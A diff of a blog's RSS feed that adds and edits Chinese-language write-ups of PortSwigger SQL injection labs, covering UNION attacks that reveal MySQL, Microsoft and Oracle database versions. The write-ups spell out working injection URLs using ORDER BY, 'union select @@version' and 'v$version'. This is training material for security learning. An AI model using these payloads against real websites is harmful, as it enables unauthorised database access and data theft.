@@ -1,4 +1,38 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Portswigger on Terminal</title><link>/tags/portswigger/</link><description>Recent content in Portswigger on Terminal</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 26 Nov 2024 22:34:27 +0800</lastBuildDate><atom:link href="/tags/portswigger/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: SQL injection UNION attack, finding a column containing text</title><link>/posts/sql-injection-lab-find-column-containing-text/</link><pubDate>Tue, 26 Nov 2024 22:34:27 +0800</pubDate><guid>/posts/sql-injection-lab-find-column-containing-text/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Portswigger on Terminal</title><link>/tags/portswigger/</link><description>Recent content in Portswigger on Terminal</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 27 Nov 2024 21:04:57 +0800</lastBuildDate><atom:link href="/tags/portswigger/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>/posts/sql-injection-lab-querying-database-version-mysql-microsoft/</link><pubDate>Wed, 27 Nov 2024 21:04:57 +0800</pubDate><guid>/posts/sql-injection-lab-querying-database-version-mysql-microsoft/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-querying-database-version-mysql-microsoft-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-querying-database-version-mysql-microsoft-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>推测SQL query为&lt;code>SELECT * FROM table WHERE category = &amp;lt;category&amp;gt;&lt;/code>&lt;/li>
+&lt;li>此题需要通过UNION 注入攻击获取MySQL、Microsoft数据库的类型和版本&lt;/li>
+&lt;li>UNION 注入攻击需要以下三步
+&lt;ol>
+&lt;li>判断列数
+&lt;ol>
+&lt;li>使用&lt;code>order by n&lt;/code>语句不断累加n，n累加到3时报错，所以判断SQL query的返回列数为2&lt;/li>
+&lt;li>url为&lt;code>/filter?category=Gifts' order by 2#&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>判断显示位
+&lt;ol>
+&lt;li>url为&lt;code>/filter?category=Gifts' union select 'a1','a2'%23&lt;/code>
+&lt;ul>
+&lt;li>&lt;code>%23&lt;/code>为&lt;code>#&lt;/code>的URL 编码，通过浏览器发送url时需要进行编码；通过Burp Suite时Burp Suite会自动进行编码
+&lt;img alt="Determine the display position" src="/img/sql-injection-lab-querying-database-version-mysql-microsoft-2.jpg">&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>获取目标数据
+&lt;ol>
+&lt;li>根据&lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet&lt;/a>，MySQL、Microsoft数据库的类型和版本获取方式为&lt;code>SELECT @@version&lt;/code>&lt;/li>
+&lt;li>url为&lt;code>/filter?category=Gifts' union select @@version,null%23&lt;/code>
+&lt;img alt="Retrieve the target data" src="/img/sql-injection-lab-querying-database-version-mysql-microsoft-3.jpg">&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection UNION attack, finding a column containing text</title><link>/posts/sql-injection-lab-find-column-containing-text/</link><pubDate>Tue, 26 Nov 2024 22:34:27 +0800</pubDate><guid>/posts/sql-injection-lab-find-column-containing-text/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-find-column-containing-text-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-find-column-containing-text-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
@@ -29,7 +63,7 @@
 &lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-querying-database-version-oracle-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>SQL query为&lt;code>SELECT * FROM table WHERE category = &amp;lt;category&amp;gt;&lt;/code>&lt;/li>
+&lt;li>推测SQL query为&lt;code>SELECT * FROM table WHERE category = &amp;lt;category&amp;gt;&lt;/code>&lt;/li>
 &lt;li>此题需要通过UNION 注入攻击获取Oracle数据库的类型和版本&lt;/li>
 &lt;li>UNION 注入攻击需要以下三步
 &lt;ol>
@@ -46,11 +80,11 @@
 &lt;img alt="Determine the display position" src="/img/sql-injection-lab-querying-database-version-oracle-2.jpg">&lt;/li>
 &lt;/ol>
 &lt;/li>
-&lt;li>进行注入
+&lt;li>获取目标数据
 &lt;ol>
 &lt;li>根据&lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet&lt;/a>，Oracle数据库的类型和版本获取方式为&lt;code>SELECT banner FROM v$version&lt;/code>&lt;/li>
 &lt;li>url为&lt;code>filter?category=Accessories'+union+select+banner,+null+from+v$version+--&lt;/code>
-&lt;img alt="Perform the injection" src="/img/sql-injection-lab-querying-database-version-oracle-3.jpg">&lt;/li>
+&lt;img alt="Retrieve the target data" src="/img/sql-injection-lab-querying-database-version-oracle-3.jpg">&lt;/li>
 &lt;/ol>
 &lt;/li>
 &lt;/ol>
